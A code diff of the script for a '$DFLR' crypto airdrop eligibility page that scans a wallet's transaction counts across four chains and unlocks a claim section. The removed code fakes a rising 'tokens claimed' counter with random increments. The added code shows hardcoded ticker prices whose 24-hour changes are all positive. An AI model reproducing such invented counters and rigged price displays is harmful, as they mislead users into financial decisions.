+        // Jika result length = 100 (offset), berarti mungkin ada lebih — lakukan second fetch
+        if (json.result.length >= 100) {
+          // fetch dengan offset besar untuk mendapat angka sesungguhnya
+          const url2 = `${chain.api}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=10000&sort=asc&apikey=${chain.key}`;
+          const res2  = await fetch(url2);
+          const json2 = await res2.json();
+          return json2.status === '1' ? json2.result.length : json.result.length;
+        }
+        return json.result.length;
+      }
+      if (json.message === 'No transactions found') return 0;
+      throw new Error(json.message || 'API error');
+    }
+
+    function setChainResult(id, txCount, done) {
+      const txEl    = document.getElementById('tx-' + id);
+      const badgeEl = document.getElementById('badge-' + id);
+      if (!done) {
+        txEl.textContent   = '—';
+        badgeEl.textContent = 'Scanning...';
+        badgeEl.className  = 'chain-badge loading';
+        return;
+      }
+      txEl.textContent = txCount + ' txs';
+      if (txCount >= 10) {
+        badgeEl.textContent = '✓ Qualified';
+        badgeEl.className   = 'chain-badge ok';
+      } else {
+        badgeEl.textContent = '✗ Not enough';
+        badgeEl.className   = 'chain-badge fail';
+      }
+    }
+
+    async function scanWallet() {
+      const addr = document.getElementById('walletInput').value.trim();
+      if (!addr) { alert('Please enter a wallet address.'); return; }
+      if (!/^0x[0-9a-fA-F]{40}$/.test(addr)) { alert('Invalid wallet address format. Must start with 0x and be 42 characters.'); return; }
+
+      const btnScan = document.getElementById('btnScan');
+      btnScan.disabled = true;
+      btnScan.textContent = 'Scanning...';
+
+      // Reset UI
+      document.getElementById('scanResult').classList.add('show');
+      document.getElementById('verdictBox').style.display = 'none';
+      document.getElementById('claimWrap').classList.remove('show');
+      CHAINS.forEach(c => setChainResult(c.id, 0, false));
+
+      const results = {};
+
+      // Scan semua chain paralel
+      await Promise.all(CHAINS.map(async (chain) => {
+        try {
+          const count = await getTxCount(chain, addr);
+          results[chain.id] = count;
+          setChainResult(chain.id, count, true);
+        } catch (err) {
+          console.warn(chain.name, err);
+          results[chain.id] = 0;
+          const badgeEl = document.getElementById('badge-' + chain.id);
+          const txEl    = document.getElementById('tx-' + chain.id);
+          txEl.textContent    = 'Error';
+          badgeEl.textContent = 'API Error';
+          badgeEl.className   = 'chain-badge fail';
+        }
+      }));
+
+      // Verdict
+      const allQualified = CHAINS.every(c => (results[c.id] || 0) >= 10);
+      const verdictBox   = document.getElementById('verdictBox');
+      verdictBox.style.display = 'block';
+
+      if (allQualified) {
+        verdictBox.className = 'verdict-box eligible';
+        verdictBox.innerHTML = `
+          <div class="verdict-icon">🎉</div>
+          <div class="verdict-title green">Eligible!</div>
+          <div class="verdict-desc">Your wallet meets all requirements across all 4 chains.<br>You can claim your $DFLR airdrop.</div>
+        `;
+        document.getElementById('claimWrap').classList.add('show');
+      } else {
+        verdictBox.className = 'verdict-box not-eligible';
+        const missing = CHAINS.filter(c => (results[c.id] || 0) < 10).map(c => c.name).join(', ');
+        verdictBox.innerHTML = `
+          <div class="verdict-icon">❌</div>
+          <div class="verdict-title red">Not Qualified</div>
+          <div class="verdict-desc">You need at least 10 transactions on: <strong style="color:#f87171">${missing}</strong>.<br>Complete more on-chain activity and try again.</div>
+        `;
+      }
+
+      btnScan.disabled = false;
+      btnScan.textContent = '🔍 Scan';
+    }
+
+    // Enter key trigger scan
+    document.getElementById('walletInput').addEventListener('keydown', e => {
+      if (e.key === 'Enter') scanWallet();
+    });
+
+    // ── CRYPTO TICKER (Binance fallback) ──
+    const PAIRS = [
+      {sym:'BTC', pair:'BTCUSDT'}, {sym:'ETH', pair:'ETHUSDT'},
+      {sym:'BNB', pair:'BNBUSDT'}, {sym:'SOL', pair:'SOLUSDT'},
+      {sym:'XRP', pair:'XRPUSDT'}, {sym:'DOGE',pair:'DOGEUSDT'},
+      {sym:'ADA', pair:'ADAUSDT'}, {sym:'TON', pair:'TONUSDT'},
+      {sym:'SHIB',pair:'SHIBUSDT'},{sym:'DOT', pair:'DOTUSDT'},
+    ];
     function fmtPrice(p) {
       if (p >= 1000)   return '$' + p.toLocaleString('en-US', {maximumFractionDigits:0});
       if (p >= 1)      return '$' + p.toFixed(2);
       if (p >= 0.0001) return '$' + p.toFixed(5);
       return '$' + p.toFixed(8);
     }
-
     function renderTicker(data) {
       const track = document.getElementById('tickerTrack');
       if (!track) return;
-      const items = [...data, ...data].map(({sym, price, change}) => {
+      track.innerHTML = [...data, ...data].map(({sym, price, change}) => {
         const up = change >= 0;
-        return `<div class="ticker-item">
-          <div class="ticker-dot" style="background:${up?'#4ade80':'#f87171'}"></div>
-          <span class="ticker-coin">${sym}</span>
-          <span class="ticker-price">${fmtPrice(price)}</span>
-          <span class="ticker-change ${up?'up':'down'}">${up?'▲':'▼'} ${Math.abs(change).toFixed(2)}%</span>
-        </div>`;
+        return `<div class="ticker-item"><div class="ticker-dot" style="background:${up?'#4ade80':'#f87171'}"></div><span class="ticker-coin">${sym}</span><span class="ticker-price">${fmtPrice(price)}</span><span class="ticker-change ${up?'up':'down'}">${up?'▲':'▼'} ${Math.abs(change).toFixed(2)}%</span></div>`;
       }).join('');
-      track.innerHTML = items;
     }
-
+    const FALLBACK = [
+      {sym:'BTC',price:104200,change:1.23},{sym:'ETH',price:2510,change:0.85},
+      {sym:'BNB',price:598,change:0.42},  {sym:'SOL',price:172,change:2.11},
+      {sym:'XRP',price:2.18,change:1.34}, {sym:'DOGE',price:0.1821,change:3.05},
+      {sym:'ADA',price:0.72,change:0.67}, {sym:'TON',price:3.12,change:1.88},
+      {sym:'SHIB',price:0.00001421,change:4.21},{sym:'DOT',price:4.21,change:0.29},
+    ];
+    renderTicker(FALLBACK);
     async function fetchPrices() {
       try {
         const symbols = JSON.stringify(PAIRS.map(p => p.pair));
-        const res = await fetch(`https://api.binance.com/api/v3/ticker/24hr?symbols=${encodeURIComponent(symbols)}`);
+        const res  = await fetch(`https://api.binance.com/api/v3/ticker/24hr?symbols=${encodeURIComponent(symbols)}`);
         const json = await res.json();
-        const data = json.map(d => {
-          const meta = PAIRS.find(p => p.pair === d.symbol);
-          return {
-            sym:    meta.sym,
-            price:  parseFloat(d.lastPrice),
-            change: parseFloat(d.priceChangePercent),
-          };
-        });
-        renderTicker(data);
-      } catch(err) {
-        console.error('Binance fetch error:', err);
-      }
+        renderTicker(json.map(d => ({ sym: PAIRS.find(p=>p.pair===d.symbol)?.sym, price: parseFloat(d.lastPrice), change: parseFloat(d.priceChangePercent) })));
+      } catch {}
     }
-
-    const total = 115000000;
-
-
-let claimed = localStorage.getItem("claimedTokens");
-
-if (!claimed) {
-  claimed = 82622471; 
-} else {
-  claimed = parseInt(claimed);
-}
-
-function updateUI() {
-  const percent = (claimed / total) * 100;
-
-  document.querySelector(".progress-fill").style.width = percent + "%";
-  document.querySelector(".progress-flare").style.left = percent + "%";
-
-  document.querySelector(".progress-info span:first-child").innerText =
-    "Claimed: " + claimed.toLocaleString();
-
-  document.querySelector(".progress-info span:last-child").innerText =
-    percent.toFixed(1) + "%";
-}
-
-
-updateUI();
-
-
-setInterval(() => {
-  
-  let increment = Math.floor(Math.random() * (4000 - 2113 + 1)) + 2113;
-
-  claimed += increment;
-
-  if (claimed > total) claimed = total;
-
-  localStorage.setItem("claimedTokens", claimed);
-
-  updateUI();
-}, 2000);
-
-    const FALLBACK = [
-      {sym:'BTC',  price:104200, change:1.23},
-      {sym:'ETH',  price:2510,   change:-0.85},
-      {sym:'BNB',  price:598,    change:0.42},
-      {sym:'SOL',  price:172,    change:2.11},
-      {sym:'XRP',  price:2.18,   change:-1.34},
-      {sym:'DOGE', price:0.1821, change:3.05},
-      {sym:'ADA',  price:0.72,   change:-0.67},
-      {sym:'TON',  price:3.12,   change:1.88},
-      {sym:'SHIB', price:0.00001421, change:4.21},
-      {sym:'DOT',  price:4.21,   change:-0.29},
-    ];
-    renderTicker(FALLBACK);
     fetchPrices();
-    setInterval(fetchPrices, 2000);
-
+    setInterval(fetchPrices, 10000);
   </script>
 </body>
 </html>
